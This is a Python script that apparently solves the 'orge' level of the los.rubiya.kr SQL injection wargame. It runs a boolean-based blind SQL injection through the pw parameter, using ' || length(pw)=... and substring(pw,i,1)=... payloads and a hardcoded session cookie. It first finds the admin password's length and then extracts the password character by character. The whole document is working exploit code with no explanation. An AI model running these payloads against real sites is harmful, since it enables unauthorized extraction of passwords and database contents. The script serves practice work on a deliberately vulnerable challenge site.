import requests

url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=1' || "
head = {'Cookie' : 'PHPSESSID=hs9ec08q7cfg9e4b8opujaufgg'}

length = 1
flag = ''

while(1):
    query = "length(pw)='{}".format(length)
    req = requests.get(url+query, headers=head)
    print("+",length)
    if "Hello admin" in req.text:
        print("총 길이는",length)
        break
    else:
        length+=1

for i in range(1, length+1):
    for j in range(48, 122):
        query = "substring(pw,{},1) = '{}".format(str(i),chr(j))
        req = requests.get(url+query, headers=head)
        if "Hello admin" in req.text:
            print(flag)
            flag=flag+chr(j)
            break

print(flag)